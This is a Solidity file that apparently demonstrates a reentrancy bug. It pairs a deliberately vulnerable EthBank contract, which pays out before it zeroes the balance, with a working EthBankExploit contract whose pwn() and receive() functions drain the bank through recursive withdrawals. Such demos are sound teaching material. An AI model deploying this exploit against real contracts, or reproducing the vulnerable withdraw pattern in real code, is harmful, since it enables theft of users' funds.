// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IEthBank {
    function deposit() external payable;
    function withdraw() external payable;
}
/*//=================////
///vulnerable contract///
///===================///*/
contract EthBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external payable {
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "failed to send ETH");

        balances[msg.sender] = 0;
    }
}


/*//=================////
///Attack contract///
///===================///*/
contract EthBankExploit {
    IEthBank public bank;

    constructor(address _bank) {
        bank = IEthBank(_bank);
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function pwn() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }
}